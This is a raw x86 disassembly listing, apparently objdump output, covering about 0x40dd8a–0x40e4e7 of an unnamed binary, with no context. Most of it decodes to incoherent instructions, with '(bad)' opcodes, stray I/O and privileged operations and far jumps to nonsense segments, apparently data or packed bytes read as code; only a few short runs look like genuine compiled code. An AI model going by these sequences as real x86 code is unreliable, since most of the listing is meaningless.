  40dd8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd8b:	mov    WORD PTR [ecx],es
  40dd8d:	iret   
  40dd8e:	rdmsr  
  40dd90:	das    
  40dd91:	cmp    BYTE PTR [ebp+edi*4+0x791d5f38],bh
  40dd98:	and    eax,0x1d158415
  40dd9d:	popa   
  40dd9e:	pusha  
  40dd9f:	xor    DWORD PTR [ebx+0x3e],ecx
  40dda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dda3:	fstp   TBYTE PTR [edx+0x34]
  40dda6:	shl    BYTE PTR [edi+0x8],1
  40dda9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddac:	fmul   DWORD PTR [esi]
  40ddae:	jle    0x40dd39
  40ddb0:	das    
  40ddb1:	xor    BYTE PTR [edx+0x3088f0c4],dh
  40ddb7:	sahf   
  40ddb8:	gs pop edx
  40ddba:	aas    
  40ddbb:	xchg   ecx,eax
  40ddbc:	in     eax,0x5d
  40ddbe:	test   DWORD PTR [ecx-0x124c1bb8],edi
  40ddc4:	adc    DWORD PTR [esi-0x503d5854],ecx
  40ddca:	inc    ecx
  40ddcb:	in     eax,dx
  40ddcc:	daa    
  40ddcd:	xchg   DWORD PTR [ebp+ecx*8-0x51],eax
  40ddd1:	jae    0x40ddd8
  40ddd3:	bound  edx,QWORD PTR [eax+esi*4-0x3]
  40ddd7:	in     al,0x58
  40ddd9:	push   es
  40ddda:	loopne 0x40ddea
  40dddc:	push   eax
  40dddd:	ss rcr bh,0x7d
  40dde1:	mov    dh,BYTE PTR [ebp-0x1f]
  40dde4:	jg     0x40de41
  40dde6:	xchg   esi,eax
  40dde7:	mov    ah,0x3b
  40dde9:	scas   eax,DWORD PTR es:[edi]
  40ddea:	popf   
  40ddeb:	jl     0x40de0c
  40dded:	cmp    al,0x2c
  40ddef:	or     al,0xad
  40ddf1:	or     eax,0xb42f93a0
  40ddf6:	pusha  
  40ddf7:	push   eax
  40ddf8:	hlt    
  40ddf9:	bound  ecx,QWORD PTR [ecx-0x6a]
  40ddfc:	pop    edx
  40ddfd:	shl    dl,1
  40ddff:	pop    esp
  40de00:	dec    esp
  40de01:	ins    DWORD PTR es:[edi],dx
  40de02:	pop    eax
  40de03:	icebp  
  40de04:	dec    ebx
  40de05:	dec    esi
  40de06:	int    0xd1
  40de08:	bound  ebx,QWORD PTR [edx-0x6c]
  40de0b:	aad    0x20
  40de0d:	mov    es,edi
  40de0f:	loope  0x40de00
  40de11:	pop    ecx
  40de12:	sahf   
  40de13:	mov    dh,0xd8
  40de15:	inc    esi
  40de16:	scas   al,BYTE PTR es:[edi]
  40de17:	ficom  WORD PTR [edx-0x696f1459]
  40de1d:	aaa    
  40de1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de1f:	pop    ss
  40de20:	jbe    0x40ddd7
  40de22:	mov    edx,0xc9a13273
  40de27:	dec    ebx
  40de28:	mov    eax,ds:0x195aa1a1
  40de2d:	sub    DWORD PTR es:[ebp-0x18],0x51
  40de32:	ja     0x40de0a
  40de34:	sub    bl,BYTE PTR [esi+0x30]
  40de37:	mov    ch,0x1b
  40de39:	cmp    DWORD PTR [edx-0x3f55feb5],esi
  40de3f:	retf   0xfbde
  40de42:	std    
  40de43:	leave  
  40de44:	out    0x60,al
  40de46:	aas    
  40de47:	jns    0x40de09
  40de49:	add    DWORD PTR [edi-0x15eee23c],esp
  40de4f:	adc    DWORD PTR [ecx+0xc],esp
  40de52:	mov    DWORD PTR [esp+edi*4],edx
  40de55:	inc    edx
  40de56:	add    DWORD PTR [ecx+ebp*8-0x1e0695f9],eax
  40de5d:	repz mov ecx,0xf3977f43
  40de63:	aam    0x8a
  40de65:	cmp    al,0x12
  40de67:	arpl   WORD PTR [edx-0x3be24e0e],dx
  40de6d:	ins    DWORD PTR es:[edi],dx
  40de6e:	out    0x7d,al
  40de70:	xchg   esp,eax
  40de71:	retf   0xe6b2
  40de74:	lahf   
  40de75:	mov    ch,al
  40de77:	popf   
  40de78:	jp     0x40deb9
  40de7a:	jge    0x40de12
  40de7c:	cmp    ecx,ebx
  40de7e:	pop    ds
  40de7f:	push   0x55ff9746
  40de84:	sar    DWORD PTR [ecx-0x4d70ece3],1
  40de8a:	stc    
  40de8b:	sbb    eax,0xb150ac5d
  40de90:	outs   dx,BYTE PTR ds:[esi]
  40de91:	out    0x50,al
  40de93:	sbb    BYTE PTR [edx+edx*8-0x733fd9f9],al
  40de9a:	int    0x97
  40de9c:	mov    ds:0xd7e552e2,eax
  40dea1:	push   esi
  40dea2:	and    DWORD PTR [ecx-0x628bf8e0],0x17
  40dea9:	pop    edi
  40deaa:	mov    esi,0xebc9c92f
  40deaf:	xchg   ebx,esi
  40deb1:	rcl    edx,1
  40deb3:	jmp    0x34b9:0xf3d58986
  40deba:	pop    es
  40debb:	xlat   BYTE PTR ds:[ebx]
  40debc:	(bad)  
  40debd:	sbb    DWORD PTR [esi+edi*8+0x44],edi
  40dec1:	shl    ebx,0xcb
  40dec4:	jmp    0x3ab5:0x5c03359
  40decb:	or     al,0xd
  40decd:	popf   
  40dece:	imul   ebx,DWORD PTR [ebx+eiz*4+0x62],0x18ab8d9a
  40ded6:	es ret 0x346c
  40deda:	fs push edi
  40dedc:	addr16 int3 
  40dede:	stc    
  40dedf:	jae    0x40df20
  40dee1:	jo     0x40deba
  40dee3:	aam    0x5e
  40dee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dee6:	cmp    bl,BYTE PTR [ecx+0x3a]
  40dee9:	push   edx
  40deea:	inc    ecx
  40deeb:	push   ds
  40deec:	and    eax,0xa9a39161
  40def1:	add    esi,ecx
  40def3:	push   cs
  40def4:	xchg   ebx,eax
  40def5:	pop    es
  40def6:	add    eax,0x7028306d
  40defb:	lds    edi,FWORD PTR [ebp-0x48628f92]
  40df01:	push   edx
  40df02:	(bad)  
  40df03:	neg    ecx
  40df05:	out    dx,eax
  40df06:	mov    al,ds:0xef4672f8
  40df0b:	iret   
  40df0c:	ss push edi
  40df0e:	sbb    BYTE PTR [edi-0x4c],bh
  40df11:	pop    esi
  40df12:	ret    
  40df13:	push   ds
  40df14:	mov    cl,0x7b
  40df16:	cli    
  40df17:	inc    ebp
  40df18:	sbb    DWORD PTR [edi+ebx*1-0x4a750248],0xca0349
  40df23:	pop    edx
  40df24:	iret   
  40df25:	mov    al,ds:0x19073a16
  40df2a:	test   eax,0xe1b8805f
  40df2f:	mov    esp,0x587df8cd
  40df34:	inc    esi
  40df35:	mov    esp,0xcb4ec61a
  40df3a:	hlt    
  40df3b:	xchg   ecx,eax
  40df3c:	sub    BYTE PTR [eax],dh
  40df3e:	and    eax,0x724075dd
  40df43:	xchg   edx,eax
  40df44:	arpl   WORD PTR [edx+ebx*4+0x51],bx
  40df48:	cmp    ebp,esp
  40df4a:	mov    al,ds:0x90a624f1
  40df4f:	add    edi,DWORD PTR [esi+0x2]
  40df52:	out    dx,al
  40df53:	and    al,0x73
  40df55:	mov    cl,0x38
  40df57:	pop    ds
  40df58:	cmp    edi,DWORD PTR [esi+0x7a]
  40df5b:	mov    BYTE PTR [eax-0x51],0xdb
  40df5f:	not    DWORD PTR [edx-0x6ab1dda7]
  40df65:	xlat   BYTE PTR ds:[ebx]
  40df66:	lds    edi,FWORD PTR [edi-0x9]
  40df69:	or     eax,0xdab002d
  40df6e:	mov    esi,eax
  40df70:	in     al,0x84
  40df72:	not    DWORD PTR [esi+0x43]
  40df75:	es ins DWORD PTR es:[edi],dx
  40df77:	push   esi
  40df78:	in     eax,dx
  40df79:	(bad)  
  40df7a:	mov    al,0x42
  40df7c:	ficom  DWORD PTR [ecx]
  40df7e:	push   cs
  40df7f:	stos   BYTE PTR es:[edi],al
  40df80:	clc    
  40df81:	mov    ah,0x79
  40df83:	push   ecx
  40df84:	call   0x8c7dc8fc
  40df89:	mov    ebp,eax
  40df8b:	inc    esi
  40df8c:	sbb    bh,BYTE PTR [ebp-0x5e]
  40df8f:	add    al,0x6e
  40df91:	sbb    al,0x5a
  40df93:	xchg   edx,eax
  40df94:	arpl   WORD PTR [edi+edx*8],ax
  40df97:	push   ss
  40df98:	das    
  40df99:	push   ebp
  40df9a:	adc    eax,0x112e1b07
  40df9f:	push   0x3c
  40dfa1:	xor    edx,ecx
  40dfa3:	imul   edi,edi,0x77d36cad
  40dfa9:	das    
  40dfaa:	add    eax,ebx
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx-0x1fbfbec6],1
  40dfde:	jmp    0x40e039
  40dfe0:	fmul   QWORD PTR [eax+0x357878b2]
  40dfe6:	jle    0x40e060
  40dfe8:	js     0x40df8c
  40dfea:	sub    al,0x2c
  40dfec:	mov    ebx,0x566f16d
  40dff1:	mov    ecx,0x52393bdc
  40dff6:	or     dl,BYTE PTR [ebx+0x491502c2]
  40dffc:	mov    ebx,0xa4a5d2cf
  40e001:	loop   0x40dfe4
  40e003:	cmp    eax,0x9a944a62
  40e008:	mov    ?,WORD PTR [ecx-0xf]
  40e00b:	push   0xffffff83
  40e00d:	enter  0x5b39,0x63
  40e011:	mov    ah,0x70
  40e013:	stos   DWORD PTR es:[edi],eax
  40e014:	jns    0x40e032
  40e016:	sahf   
  40e017:	clc    
  40e018:	arpl   ax,dx
  40e01a:	imul   edi,DWORD PTR [eax],0x1d
  40e01d:	pop    ebx
  40e01e:	lock sbb DWORD PTR [edi+edi*2+0x69],ebp
  40e023:	in     al,dx
  40e024:	bound  eax,QWORD PTR [ebx-0x51955348]
  40e02a:	sbb    edx,DWORD PTR [ebx+0x73]
  40e02d:	dec    esi
  40e02e:	aas    
  40e02f:	(bad)  
  40e030:	aad    0xcc
  40e032:	dec    eax
  40e033:	popa   
  40e034:	xchg   edi,eax
  40e035:	popf   
  40e036:	inc    ebx
  40e037:	xchg   ebx,eax
  40e038:	mov    cl,0x41
  40e03a:	fdiv   DWORD PTR [eax]
  40e03c:	lods   eax,DWORD PTR ds:[esi]
  40e03d:	push   cs
  40e03e:	mov    ebx,0xa5281ea3
  40e043:	dec    eax
  40e044:	or     eax,DWORD PTR [ebp+0x2be263a8]
  40e04a:	mov    ds,WORD PTR [eax+edx*1-0x3]
  40e04e:	nop
  40e04f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e050:	fs fwait
  40e052:	pop    ebp
  40e053:	dec    ebp
  40e054:	jnp    0x40e072
  40e056:	jmp    0x40e087
  40e058:	xor    esi,DWORD PTR [ecx]
  40e05a:	sbb    ah,BYTE PTR [ecx-0x20a5fa46]
  40e060:	scas   al,BYTE PTR es:[edi]
  40e061:	cli    
  40e062:	jecxz  0x40e05a
  40e064:	inc    ebp
  40e065:	call   0x96a4:0x89b7b80a
  40e06c:	lea    edi,[ebx-0x3fe71442]
  40e072:	imul   ebx
  40e074:	out    0x11,al
  40e076:	clc    
  40e077:	retf   
  40e078:	pop    ebp
  40e079:	ret    
  40e07a:	mov    DWORD PTR [edx-0x19],esp
  40e07d:	or     ebx,edx
  40e07f:	jbe    0x40e0fd
  40e081:	lea    ebx,[esi+ebx*4-0x35067036]
  40e088:	jnp    0x40e09c
  40e08a:	jge    0x40e011
  40e08c:	dec    edx
  40e08d:	adc    ebp,0x69a5e22b
  40e093:	mov    dl,0xe1
  40e095:	mov    dh,0x8c
  40e097:	ss xor eax,0x149ebeee
  40e09d:	ficomp WORD PTR [ecx]
  40e09f:	icebp  
  40e0a0:	xor    esp,esp
  40e0a2:	loop   0x40e0ee
  40e0a4:	bound  edx,QWORD PTR [ebp+0x53]
  40e0a7:	ret    0x1526
  40e0aa:	stc    
  40e0ab:	jbe    0x40e123
  40e0ad:	arpl   WORD PTR [esi-0x7861d4a3],di
  40e0b3:	js     0x40e0f8
  40e0b5:	sahf   
  40e0b6:	adc    eax,0xbe120d3f
  40e0bb:	lock arpl WORD PTR [ebp+esi*2+0x5b4ad7cd],si
  40e0c3:	inc    ebp
  40e0c4:	xor    eax,0x644c4b50
  40e0c9:	test   BYTE PTR [ecx+0x72f621fc],dh
  40e0cf:	int    0x4
  40e0d1:	fcmovb st,st(5)
  40e0d3:	sbb    dl,BYTE PTR [ebx+0x249468]
  40e0d9:	test   DWORD PTR [ebp+0x78],0xfcf1c237
  40e0e0:	test   DWORD PTR [esi+edx*2+0x62],0xa11a8e14
  40e0e8:	cli    
  40e0e9:	adc    BYTE PTR [esi],bl
  40e0eb:	lahf   
  40e0ec:	(bad)  
  40e0ed:	int3   
  40e0ee:	mov    cl,ah
  40e0f0:	je     0x40e150
  40e0f2:	aas    
  40e0f3:	sar    DWORD PTR [ebp-0x2726d50b],0x6e
  40e0fa:	xchg   ebx,eax
  40e0fb:	xchg   ebx,eax
  40e0fc:	xchg   ecx,eax
  40e0fd:	ret    
  40e0fe:	push   edx
  40e0ff:	and    ch,BYTE PTR [ecx+0x6e378bb3]
  40e105:	mov    dh,0x79
  40e107:	inc    esi
  40e108:	push   eax
  40e109:	into   
  40e10a:	xlat   BYTE PTR ds:[ebx]
  40e10b:	shl    esi,1
  40e10d:	inc    edx
  40e10e:	cmc    
  40e10f:	add    BYTE PTR [esi+ecx*2],bl
  40e112:	aas    
  40e113:	lods   eax,DWORD PTR ds:[esi]
  40e114:	xchg   esi,eax
  40e115:	adc    ecx,DWORD PTR [esi-0x100fb0eb]
  40e11b:	fidiv  DWORD PTR [edi+esi*8-0x354fedf2]
  40e122:	mov    ebp,DWORD PTR [ebx]
  40e124:	and    al,0x65
  40e126:	aam    0x21
  40e128:	out    dx,eax
  40e129:	loopne 0x40e0d3
  40e12b:	mov    ecx,0xbdd88454
  40e130:	or     BYTE PTR [ecx-0xa],dl
  40e133:	pop    ss
  40e134:	or     ah,0x39
  40e137:	inc    esp
  40e138:	jl     0x40e0ef
  40e13a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e13b:	adc    cl,BYTE PTR [ebx-0x41fd0b57]
  40e141:	retf   
  40e142:	xchg   edi,eax
  40e143:	sub    DWORD PTR [edx+ebp*1],ebp
  40e146:	outs   dx,BYTE PTR ds:[esi]
  40e147:	push   esp
  40e148:	ins    DWORD PTR es:[edi],dx
  40e149:	cli    
  40e14a:	push   0x493583fa
  40e14f:	adc    al,BYTE PTR [esi]
  40e151:	pushf  
  40e152:	iret   
  40e153:	push   ebx
  40e154:	inc    edx
  40e155:	jae    0x40e1d6
  40e157:	fmul   st(3),st
  40e159:	cli    
  40e15a:	pop    eax
  40e15b:	bnd call 0x3bc06112
  40e161:	rcr    BYTE PTR [esp+eiz*8-0x3bb520bd],0xcc
  40e169:	dec    ebp
  40e16a:	sbb    al,0x33
  40e16c:	aaa    
  40e16d:	xchg   edi,eax
  40e16e:	add    esp,DWORD PTR [ecx]
  40e170:	je     0x40e1ca
  40e172:	cmp    DWORD PTR [esi+0x75],ecx
  40e175:	pop    ebx
  40e176:	push   cs
  40e177:	scas   al,BYTE PTR es:[edi]
  40e178:	fwait
  40e179:	outs   dx,BYTE PTR ds:[esi]
  40e17a:	pop    esp
  40e17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e17c:	dec    esp
  40e17d:	int3   
  40e17e:	fmul   DWORD PTR [edi]
  40e181:	pop    ds
  40e182:	and    BYTE PTR [edx+0x40],al
  40e185:	(bad)
  40e188:	mov    ds:0xe538e720,eax
  40e18d:	dec    ebx
  40e18e:	dec    ebp
  40e18f:	popf   
  40e190:	cld    
  40e191:	ds inc esi
  40e193:	mov    bl,0x1d
  40e195:	and    eax,0x725f19c5
  40e19a:	stos   DWORD PTR es:[edi],eax
  40e19b:	mov    cl,0x8e
  40e19d:	mov    BYTE PTR [edx+0x325116c7],cl
  40e1a3:	in     al,0x88
  40e1a5:	sub    al,0x5d
  40e1a7:	inc    ebp
  40e1a8:	jmp    0x89e8ec0a
  40e1ad:	std    
  40e1ae:	cmc    
  40e1af:	sbb    eax,0x1462ee4c
  40e1b4:	xchg   edx,eax
  40e1b5:	test   BYTE PTR [ebx],bl
  40e1b7:	rcl    dl,1
  40e1b9:	mov    ah,0xb4
  40e1bb:	rcr    bh,cl
  40e1bd:	ror    esi,0x39
  40e1c0:	dec    eax
  40e1c1:	xchg   ebp,eax
  40e1c2:	sub    eax,0x1bb7c417
  40e1c7:	retf   
  40e1c8:	in     eax,dx
  40e1c9:	jns    0x40e1b2
  40e1cb:	mov    ds:0x8ce57233,al
  40e1d0:	xchg   esi,eax
  40e1d1:	xchg   BYTE PTR [ebp-0xb],cl
  40e1d4:	call   0xa35c56c9
  40e1d9:	daa    
  40e1da:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1dc:	add    al,al
  40e1de:	sub    al,0xbf
  40e1e0:	mov    edx,0xba2b95a5
  40e1e5:	inc    edx
  40e1e6:	pushf  
  40e1e7:	sbb    cl,cl
  40e1e9:	(bad)  
  40e1eb:	cmp    al,0xec
  40e1ed:	xchg   DWORD PTR [esi+ecx*1+0x5d],edi
  40e1f1:	pop    ebp
  40e1f2:	rol    bh,0x2f
  40e1f5:	fidiv  DWORD PTR [ecx]
  40e1f7:	data16 in al,0xcb
  40e1fa:	xor    bl,al
  40e1fc:	cs inc edi
  40e1fe:	(bad)
  40e201:	(bad)  
  40e202:	(bad)  
  40e203:	ficomp DWORD PTR [esi]
  40e205:	add    cl,BYTE PTR [edi+0x5dd26f13]
  40e20b:	jmp    0x40e1ed
  40e20d:	fcom   st(4)
  40e20f:	lds    esp,FWORD PTR [edx+0x4e71b50a]
  40e215:	shr    ebx,1
  40e217:	mov    BYTE PTR [edi-0x31],0xf1
  40e21b:	jg     0x40e20c
  40e21d:	xor    DWORD PTR [edx],ecx
  40e21f:	ss mov ebp,0x33328cbf
  40e225:	mov    BYTE PTR [ebx],0xc3
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	push   es
  40e23b:	callw  0x27af
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e1fb
  40e247:	sbb    esi,esi
  40e249:	push   ebp
  40e24a:	sbb    BYTE PTR [eax-0x112bf5f1],dl
  40e250:	mov    edi,0x210acbe2
  40e255:	cmp    ch,dh
  40e257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e258:	ds mov eax,?
  40e25b:	push   ebx
  40e25c:	or     dh,BYTE PTR [ebp+0x75a7cf1a]
  40e262:	cs aas 
  40e264:	mov    dl,0x44
  40e266:	popa   
  40e267:	push   ebx
  40e268:	xor    ebx,DWORD PTR [ecx-0x5af94b95]
  40e26e:	(bad)  
  40e26f:	faddp  st(4),st
  40e271:	sbb    bl,cl
  40e273:	in     eax,dx
  40e274:	bound  esp,QWORD PTR [esi+0xf]
  40e277:	pop    eax
  40e278:	bound  edx,QWORD PTR [ebx]
  40e27a:	push   edx
  40e27b:	or     al,0x4c
  40e27d:	int3   
  40e27e:	fisubr DWORD PTR [edi+0x74]
  40e281:	and    dl,BYTE PTR [ecx]
  40e283:	xor    DWORD PTR [ebx],esi
  40e285:	adc    ebx,esp
  40e287:	mov    cl,0xfe
  40e289:	sbb    al,BYTE PTR [ebp-0x5a]
  40e28c:	xor    BYTE PTR [eax+0x728a51de],0x96
  40e293:	inc    esp
  40e294:	dec    edi
  40e295:	xchg   dl,ah
  40e297:	inc    esp
  40e298:	push   0xffffff97
  40e29a:	mov    al,ds:0xd93c3f63
  40e29f:	das    
  40e2a0:	es xor al,0x56
  40e2a3:	sbb    DWORD PTR [ebx],0x12
  40e2a6:	jae    0x40e257
  40e2a8:	cmp    dl,BYTE PTR [edx]
  40e2aa:	(bad)  
  40e2ab:	ja     0x40e2bf
  40e2ad:	xchg   ecx,eax
  40e2ae:	fs push esi
  40e2b0:	clc    
  40e2b1:	sub    dh,dh
  40e2b3:	dec    edi
  40e2b4:	pop    edx
  40e2b5:	ins    DWORD PTR es:[edi],dx
  40e2b6:	mov    ds,WORD PTR [ecx-0x29a2419f]
  40e2bc:	retf   0x5669
  40e2bf:	jmp    0x40e2e4
  40e2c1:	jge    0x40e274
  40e2c3:	push   eax
  40e2c4:	test   DWORD PTR [esi+0x6d4c2975],ebp
  40e2ca:	jnp    0x40e33a
  40e2cc:	loopne 0x40e2ab
  40e2ce:	scas   eax,DWORD PTR es:[edi]
  40e2cf:	sub    BYTE PTR [ebp+0xf],0x61
  40e2d3:	xor    DWORD PTR [esi+edi*1],esp
  40e2d6:	arpl   bp,bp
  40e2d8:	stos   BYTE PTR es:[edi],al
  40e2d9:	inc    ebx
  40e2da:	sub    DWORD PTR [esi],edi
  40e2dc:	xchg   ebp,eax
  40e2dd:	xchg   DWORD PTR [eax+ebp*8],ebx
  40e2e0:	jp     0x40e2a9
  40e2e2:	add    al,0xd1
  40e2e4:	in     eax,0x29
  40e2e6:	cmp    eax,0x8420d515
  40e2eb:	leave  
  40e2ec:	xor    al,0x89
  40e2ee:	inc    edx
  40e2ef:	xor    dl,ch
  40e2f1:	ret    
  40e2f2:	stos   DWORD PTR es:[edi],eax
  40e2f3:	cld    
  40e2f4:	pop    DWORD PTR [ecx+0x6c]
  40e2f7:	dec    esi
  40e2f8:	out    0xc9,eax
  40e2fa:	adc    al,0xb
  40e2fc:	and    eax,0xd551188a
  40e301:	push   ebp
  40e302:	lods   eax,DWORD PTR ds:[esi]
  40e303:	inc    edx
  40e304:	xchg   ebx,eax
  40e305:	xor    BYTE PTR [ecx+0x27],ah
  40e308:	jle    0x40e2e2
  40e30a:	mov    ds:0x78067f00,al
  40e30f:	rcr    eax,1
  40e311:	push   esp
  40e312:	sar    DWORD PTR [edi],cl
  40e314:	mov    ebp,0xcef1722d
  40e319:	add    BYTE PTR [eax],bl
  40e31b:	jmp    0x888c:0x740cf756
  40e322:	adc    dl,BYTE PTR [edi]
  40e324:	jge    0x40e348
  40e326:	push   ebx
  40e327:	push   es
  40e328:	aad    0x4d
  40e32a:	xlat   BYTE PTR ds:[ebx]
  40e32b:	mov    eax,0x3ff1658
  40e330:	jno    0x40e386
  40e332:	sub    edx,DWORD PTR [esi+0x1a]
  40e335:	pushf  
  40e336:	out    0xbf,eax
  40e338:	cld    
  40e339:	fimul  WORD PTR [esi-0x7cba71c4]
  40e33f:	out    dx,eax
  40e340:	mov    bl,0x9d
  40e342:	outs   dx,DWORD PTR ds:[esi]
  40e343:	mov    ecx,eax
  40e345:	ret    
  40e346:	add    BYTE PTR [ecx],dh
  40e348:	idiv   BYTE PTR [edi+edi*1-0x43]
  40e34c:	pop    ds
  40e34d:	jns    0x40e3b1
  40e34f:	dec    ebp
  40e350:	dec    ebp
  40e351:	cs add al,0x96
  40e354:	test   al,0x6b
  40e356:	jnp    0x40e33e
  40e358:	add    al,0xb6
  40e35a:	or     BYTE PTR [ebx+0x3e0ee0d7],bh
  40e360:	ss xchg ebx,eax
  40e362:	mov    cl,0x7
  40e364:	and    esp,0x11
  40e367:	cmp    ebp,DWORD PTR [ebx]
  40e369:	mov    BYTE PTR [edi],bl
  40e36b:	or     DWORD PTR [ebx],eax
  40e36d:	xchg   BYTE PTR [eax],cl
  40e36f:	inc    eax
  40e370:	sbb    al,0x1e
  40e372:	addr16 sar dl,0x4f
  40e376:	xchg   ecx,eax
  40e377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e378:	mov    edi,0xc4400b7c
  40e37d:	rcl    DWORD PTR ds:[eax+0x23b6d41b],0x40
  40e385:	stc    
  40e386:	retf   
  40e387:	pop    edi
  40e388:	pop    esi
  40e389:	pushf  
  40e38a:	jbe    0x40e34a
  40e38c:	and    eax,0x34bc9ea1
  40e391:	sbb    DWORD PTR [eax],ebx
  40e393:	inc    DWORD PTR [ebp+eiz*8-0x1b356716]
  40e39a:	and    dl,dl
  40e39c:	pop    esi
  40e39d:	mov    eax,ds:0x5fb48437
  40e3a2:	mov    cl,0x92
  40e3a4:	sbb    dl,BYTE PTR [ebx-0x39]
  40e3a7:	stos   BYTE PTR es:[edi],al
  40e3a8:	icebp  
  40e3a9:	call   0xc7a:0x102a2d20
  40e3b0:	mov    al,0x30
  40e3b2:	int3   
  40e3b3:	shl    BYTE PTR [eax],1
  40e3b5:	sbb    BYTE PTR [ecx],al
  40e3b7:	scas   eax,DWORD PTR es:[edi]
  40e3b8:	push   edi
  40e3b9:	mov    bh,0xcd
  40e3bb:	and    ebx,DWORD PTR [eax+0x57]
  40e3be:	test   BYTE PTR ds:0x62e4bfcf,ch
  40e3c4:	sbb    eax,0xdefdfbd6
  40e3c9:	jge    0x40e3a4
  40e3cb:	cli    
  40e3cc:	out    0x5b,eax
  40e3ce:	das    
  40e3cf:	mov    ds:0xc908626f,eax
  40e3d4:	mov    ds:0xd7af9618,al
  40e3d9:	push   0xffffff9e
  40e3db:	nop
  40e3dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3dd:	clc    
  40e3de:	inc    eax
  40e3df:	fldenv [ecx-0x333cb8d8]
  40e3e5:	pop    edi
  40e3e6:	popa   
  40e3e7:	mov    al,0x5e
  40e3e9:	sbb    DWORD PTR [eax+0x47f6bc6a],ebx
  40e3ef:	cs xchg edx,eax
  40e3f1:	pop    ebp
  40e3f2:	(bad)  
  40e3f3:	(bad)  [esi]
  40e3f5:	js     0x40e451
  40e3f7:	add    esi,DWORD PTR [ecx+0x38]
  40e3fa:	dec    ebx
  40e3fb:	push   es
  40e3fc:	repz mov edi,0xcb14dc4
  40e402:	pushf  
  40e403:	jno    0x40e3d3
  40e405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e406:	test   DWORD PTR [eax-0x10],0xda2f2adc
  40e40d:	fimul  DWORD PTR [edx]
  40e40f:	fcomp  QWORD PTR [ecx-0x2d8ec05a]
  40e415:	js     0x40e3bf
  40e417:	lea    ebp,[ebx+esi*2+0x1]
  40e41b:	cmp    eax,0xa00e639c
  40e420:	cmp    ch,bh
  40e422:	inc    ecx
  40e423:	pop    edx
  40e424:	or     ebx,0xffffff8d
  40e427:	mov    dl,al
  40e429:	cmp    BYTE PTR [ecx],0x84
  40e42c:	ror    DWORD PTR [edx+0x306ff92c],1
  40e432:	out    dx,eax
  40e433:	cld    
  40e434:	pusha  
  40e435:	ret    0x9e96
  40e438:	push   ss
  40e439:	int3   
  40e43a:	add    DWORD PTR [esi-0x47],0xffffff81
  40e43e:	rcl    ebx,0x19
  40e441:	ja     0x40e488
  40e443:	gs dec eax
  40e445:	hlt    
  40e446:	jl     0x40e497
  40e448:	test   al,0xee
  40e44a:	mov    ebx,0x78871845
  40e44f:	jno    0x40e402
  40e451:	xor    BYTE PTR [ebp-0x13e5149a],0x92
  40e458:	push   eax
  40e459:	add    eax,0xe55d7dc1
  40e45e:	popf   
  40e45f:	inc    esi
  40e460:	fcomp  DWORD PTR [ebp+0xf]
  40e463:	call   0xd3b62f5a
  40e468:	iret   
  40e469:	scas   eax,DWORD PTR es:[edi]
  40e46a:	popa   
  40e46b:	out    dx,al
  40e46c:	push   ds
  40e46d:	ffreep st(7)
  40e46f:	jmp    0xc319:0xa900fa2d
  40e476:	call   0xf66d0a08
  40e47b:	xchg   BYTE PTR [ebp+0x7c70d5bc],al
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    ebp,DWORD PTR [ebx-0x26]
  40e4b9:	ja     0x40e517
  40e4bb:	add    dh,BYTE PTR [ebp+0x7e357878]
  40e4c1:	js     0x40e53b
  40e4c3:	dec    edx
  40e4c4:	mov    WORD PTR [ebp+0x44],?
  40e4c7:	js     0x40e4a6
  40e4c9:	scas   eax,DWORD PTR es:[edi]
  40e4ca:	push   edi
  40e4cb:	cmp    dl,ch
  40e4cd:	in     eax,0xd9
  40e4cf:	fistp  QWORD PTR [edx+0x91c87ba]
  40e4d5:	(bad)  
  40e4d6:	jle    0x40e493
  40e4d8:	(bad)  
  40e4da:	fidivr WORD PTR [edx]
  40e4dc:	int3   
  40e4dd:	xchg   edi,eax
  40e4de:	mov    al,ds:0xa22253a7
  40e4e3:	pop    ecx
  40e4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4e5:	scas   eax,DWORD PTR es:[edi]
  40e4e6:	push   esi
  40e4e7:	jmp    0x6fed:0xa346f3cd
